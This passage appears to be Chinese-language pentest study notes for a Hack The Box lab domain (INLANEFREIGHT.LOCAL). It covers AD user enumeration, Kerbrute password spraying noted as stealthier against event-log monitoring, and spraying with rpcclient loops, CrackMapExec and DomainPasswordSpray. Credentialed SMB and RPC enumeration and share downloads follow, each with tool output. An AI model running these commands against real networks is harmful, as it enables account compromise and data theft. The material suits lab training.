<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ ./windapsearch.py --dc-ip 172.16.5.5 -u &quot;&quot; -U</span><br><span class="line"># [-D &quot;CN=uname,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot; -W &quot;passwd&quot;]</span><br><span class="line"></span><br><span class="line">[+] No username provided. Will try anonymous bind.</span><br><span class="line">[+] Using Domain Controller at: 172.16.5.5</span><br><span class="line">[+] Getting defaultNamingContext from Root DSE</span><br><span class="line">[+]	Found: DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+] Attempting bind</span><br><span class="line">[+]	...success! Binded as: </span><br><span class="line">[+]	 None</span><br><span class="line"></span><br><span class="line">[+] Enumerating all AD users</span><br><span class="line">[+]	Found 2906 users: </span><br><span class="line"></span><br><span class="line">cn: Guest</span><br><span class="line"></span><br><span class="line">cn: Htb Student</span><br><span class="line">userPrincipalName: htb-student@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Annie Vazquez</span><br><span class="line">userPrincipalName: avazquez@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Paul Falcon</span><br><span class="line">userPrincipalName: pfalcon@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Fae Anthony</span><br><span class="line">userPrincipalName: fanthony@inlanefreight.local</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><h3 id="Kerbrute"><a href="#Kerbrute" class="headerlink" title="Kerbrute"></a>Kerbrute</h3><p>Kerbrute 工具使用[Kerberos 预身份验证](<a target="_blank" rel="noopener" href="https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos">https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos</a> Pre-Authentication)，这是一种更快、更隐蔽的密码喷洒方法。此方法不会生成 Windows 事件 ID <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625">4625：帐户登录失败</a>或经常被监视的登录失败。该工具在没有 Kerberos 预身份验证的情况下向域控制器发送 TGT 请求以执行用户名枚举。如果 KDC 回复<code>PRINCIPAL UNKNOWN</code>错误，则用户名无效。每当 KDC 提示进行 Kerberos 预身份验证时，都表示用户名存在，该工具会将其标记为有效。这种用户名枚举方法不会导致登录失败，也不会锁定帐户。但是，一旦有了有效用户列表并转而使用此工具进行密码喷洒，失败的 Kerberos 预身份验证尝试将计入帐户的登录失败帐户数，并可能导致帐户锁定。</p>
<p>Kerbrute 进行用户名枚举将生成事件 ID <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768">4768：已请求 Kerberos 身份验证票证 (TGT) </a>（仅当通过组策略启用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging">Kerberos 事件日志记录</a>时才会触发此事件）。防御者可以调整其 SIEM 工具以查找此事件 ID 的涌入，这可能表明存在攻击。</p>
<blockquote>
<p>如果从内部网络中的位置根本无法访问，可以用<code>Kerbrute</code>来枚举有效的 AD 帐户并进行密码喷洒。</p>
</blockquote>
<p>美姓名统计字典: <a target="_blank" rel="noopener" href="https://github.com/insidetrust/statistically-likely-usernames">statisticsly-likely-usernames</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/02/17 22:16:11 &gt;  Using KDC(s):</span><br><span class="line">2022/02/17 22:16:11 &gt;  	172.16.5.5:88</span><br><span class="line"></span><br><span class="line">2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 jjones@inlanefreight.local</span><br><span class="line">2022/02/17 22:16:11 &gt;  [+] VALID USERNAME:	 sbrown@inlanefreight.local</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Password-Spraying"><a href="#Password-Spraying" class="headerlink" title="Password Spraying"></a>Password Spraying</h1><p>密码喷洒可能导致获得系统访问权限并可能在目标网络上立足。攻击涉及尝试使用一个常用密码和更长的用户名或电子邮件地址列表登录公开的服务。用户名和电子邮件可能是在渗透测试的 OSINT 阶段或最初的枚举尝试期间收集的。</p>
<blockquote>
<p>请记住，渗透测试不是静态的，当发现新数据时，要不断地迭代几种技术并重复过程。</p>
</blockquote>
<h2 id="From-Linux"><a href="#From-Linux" class="headerlink" title="From Linux"></a>From Linux</h2><h3 id="rpcclient-bash-script"><a href="#rpcclient-bash-script" class="headerlink" title="rpcclient &amp; bash script"></a>rpcclient &amp; bash script</h3><p><code>rpcclient</code>不会立即显示有效登录，响应表明登录成功。 通过响应中的<code>Authority Name</code>过滤掉无效的登录尝试。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">for</span> u <span class="keyword">in</span> $(<span class="built_in">cat</span> valid_users.txt);<span class="keyword">do</span> rpcclient -U <span class="string">&quot;<span class="variable">$u</span>%Welcome1&quot;</span> -c <span class="string">&quot;getusername;quit&quot;</span> 172.16.5.5 | grep Authority; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">Account Name: tjohnson, Authority Name: INLANEFREIGHT</span><br><span class="line">Account Name: sgage, Authority Name: INLANEFREIGHT</span><br></pre></td></tr></table></figure>

<h3 id="Kerbrute-1"><a href="#Kerbrute-1" class="headerlink" title="Kerbrute"></a>Kerbrute</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1</span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/02/17 22:57:12 &gt;  Using KDC(s):</span><br><span class="line">2022/02/17 22:57:12 &gt;  	172.16.5.5:88</span><br><span class="line"></span><br><span class="line">2022/02/17 22:57:12 &gt;  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1</span><br><span class="line">2022/02/17 22:57:12 &gt;  Done! Tested 57 logins (1 successes) in 0.172 seconds</span><br></pre></td></tr></table></figure>

<h3 id="CrackMapExec-1"><a href="#CrackMapExec-1" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 </span><br></pre></td></tr></table></figure>

<p>针对域控制器快速验证凭据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123</span><br></pre></td></tr></table></figure>

<p><code>--local-auth</code>尝试在每台计算机上登录一次，从而消除了帐户锁定的风险。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo crackmapexec smb  172.16.5.0/23 -u uname [-H NTLM / -p passwd] --local-auth</span><br></pre></td></tr></table></figure>

<h2 id="From-Windows"><a href="#From-Windows" class="headerlink" title="From Windows"></a>From Windows</h2><h3 id="DomainPasswordSpray-ps1"><a href="#DomainPasswordSpray-ps1" class="headerlink" title="DomainPasswordSpray.ps1"></a>DomainPasswordSpray.ps1</h3><p><code>-UserList</code> 生成用户列表（默认启用）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\DomainPasswordSpray.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-DomainPasswordSpray</span> <span class="literal">-Password</span> Welcome1 <span class="literal">-OutFile</span> spray_success <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line"></span><br><span class="line">[*] Current domain is compatible with Fine<span class="literal">-Grained</span> Password Policy.</span><br><span class="line">[*] Now creating a list of users to spray...</span><br><span class="line">[*] The smallest lockout threshold discovered <span class="keyword">in</span> the domain is <span class="number">5</span> login attempts.</span><br><span class="line">[*] Removing disabled users from list.</span><br><span class="line">[*] There are <span class="number">2923</span> total users found.</span><br><span class="line">[*] Removing users within <span class="number">1</span> attempt of locking out from list.</span><br><span class="line">[*] Created a userlist containing <span class="number">2923</span> users gathered from the current user<span class="string">&#x27;s domain</span></span><br><span class="line"><span class="string">[*] The domain password policy observation window is set to  minutes.</span></span><br><span class="line"><span class="string">[*] Setting a  minute wait in between sprays.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Confirm Password Spray</span></span><br><span class="line"><span class="string">Are you sure you want to perform a password spray against 2923 accounts?</span></span><br><span class="line"><span class="string">[Y] Yes  [N] No  [?] Help (default is &quot;Y&quot;): Y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Password spraying has begun with  1  passwords</span></span><br><span class="line"><span class="string">[*] This might take a while depending on the total number of users</span></span><br><span class="line"><span class="string">[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM</span></span><br><span class="line"><span class="string">[*] Writing successes to spray_success</span></span><br><span class="line"><span class="string">[*] SUCCESS! User:sgage Password:Welcome1</span></span><br><span class="line"><span class="string">[*] SUCCESS! User:mholliday Password:Welcome1</span></span><br><span class="line"><span class="string">[*] SUCCESS! User:tjohnson Password:Welcome1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Password spraying is complete</span></span><br><span class="line"><span class="string">[*] Any passwords that were successfully sprayed have been output to spray_success</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Credentialed-Enumeration"><a href="#Credentialed-Enumeration" class="headerlink" title="Credentialed Enumeration"></a>Credentialed Enumeration</h1><p><strong>SID</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-21-&lt;域标识符&gt;-&lt;子域标识符&gt;-&lt;RID&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>S</code>: 表示这是一个 SID</li>
<li><code>1</code>: 表示 SID 的版本号</li>
<li><code>5</code>: 表示授权机构（在这种情况下，表示 NT 权限）</li>
<li><code>&lt;域标识符&gt;</code>: 这是域或本地计算机的唯一标识符</li>
<li><code>&lt;子域标识符&gt;</code>: 用于标识特定的子域</li>
<li><code>&lt;RID&gt;</code>: 这是相对标识符</li>
</ul>
<p><strong>RID</strong></p>
<ul>
<li><code>500</code>: 内置本地管理员账户的 RID</li>
<li><code>501</code>: 内置访客账户的 RID</li>
<li><code>512</code>: 域管理员组的 RID</li>
<li><code>1000+</code>: 普通用户账户的 RID，从 1000 开始分配给本地用户</li>
</ul>
<h2 id="CrackMapExec-2"><a href="#CrackMapExec-2" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h2><h3 id="Domain-User-enum"><a href="#Domain-User-enum" class="headerlink" title="Domain User enum"></a>Domain User enum</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Domain-Group-enum"><a href="#Domain-Group-enum" class="headerlink" title="Domain Group enum"></a>Domain Group enum</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Contractors                              membercount: 138</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Accounting                               membercount: 15</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Engineering                              membercount: 19</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Executives                               membercount: 10</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Human Resources                          membercount: 36</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="loggedon"><a href="#loggedon" class="headerlink" title="loggedon"></a>loggedon</h3><p><code>--loggedon-users</code> 尝试枚举登陆用户，如果有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)</span><br><span class="line">SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users</span><br><span class="line">SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="share-enum"><a href="#share-enum" class="headerlink" title="share enum"></a>share enum</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ            Logon server share </span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  User Shares     READ</span><br></pre></td></tr></table></figure>

<h3 id="share-spider"><a href="#share-spider" class="headerlink" title="share spider"></a>share spider</h3><p>爬取 share 目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share &#x27;Department Shares&#x27;</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 </span><br><span class="line">SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:</span><br><span class="line">SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: [&#x27;print$&#x27;]</span><br><span class="line">SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: [&#x27;ico&#x27;, &#x27;lnk&#x27;]</span><br><span class="line">SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200</span><br><span class="line">SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus</span><br></pre></td></tr></table></figure>

<p>运行完成后会将结果写入<code>/tmp/cme_spider_plus/&lt;ip of host&gt;.json</code></p>
<h2 id="SMBmap"><a href="#SMBmap" class="headerlink" title="SMBmap"></a>SMBmap</h2><p>用于收集 SMB 共享、权限和共享内容（如果可访问）的列表。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R &#x27;Department Shares&#x27; --dir-only</span><br><span class="line"></span><br><span class="line">[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               </span><br><span class="line">        Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	Department Shares                                 	READ ONLY	</span><br><span class="line">	.\Department Shares\*</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:34:29 2022	.</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:34:29 2022	..</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:14:48 2022	Accounting</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:14:39 2022	Executives</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:14:57 2022	Finance</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:15:04 2022	HR</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:15:21 2022	IT</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:15:29 2022	Legal</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:15:37 2022	Marketing</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:15:47 2022	Operations</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:15:58 2022	R&amp;D</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:16:10 2022	Temp</span><br><span class="line">	dr--r--r--                0 Thu Mar 31 15:16:18 2022	Warehouse</span><br><span class="line"></span><br><span class="line">    &lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><h3 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient -N -L \\\\172.16.5.5</span><br><span class="line"># -U forend%Klmcargo2</span><br></pre></td></tr></table></figure>

<h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -N \\\\172.16.5.5\\share</span><br><span class="line"></span><br><span class="line">smb: \&gt; recurse ON		# 启用递归模式</span><br><span class="line">smb: \&gt; prompt OFF		# 关闭下载提示</span><br><span class="line">smb: \&gt; mget *</span><br></pre></td></tr></table></figure>

<h2 id="rpcclient-1"><a href="#rpcclient-1" class="headerlink" title="rpcclient"></a>rpcclient</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U &quot;&quot; -N 172.16.5.5</span><br><span class="line"># -U uname%passwd</span><br></pre></td></tr></table></figure>

<h3 id="enum-1"><a href="#enum-1" class="headerlink" title="enum"></a>enum</h3><p>queryuser RID  查询某个用户的详细信息</p>
<p>enumdomusers  按名称和 RID 打印出所有域用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; queryuser 0x457</span><br><span class="line"></span><br><span class="line">        User Name   :   htb-student</span><br><span class="line">        Full Name   :   Htb Student</span><br><span class="line">        Home Drive  :</span><br><span class="line">        Dir Drive   :</span><br><span class="line">        Profile Path:</span><br><span class="line">        Logon Script:</span><br><span class="line">        Description :</span><br><span class="line">        Workstations:</span><br><span class="line">        Comment     :</span><br><span class="line">        Remote Dial :</span><br><span class="line">        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST</span><br><span class="line">        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST</span><br><span class="line">        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT</span><br><span class="line">        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT</span><br><span class="line">        Password can change Time :      Thu, 28 Oct 2021 12:26:52 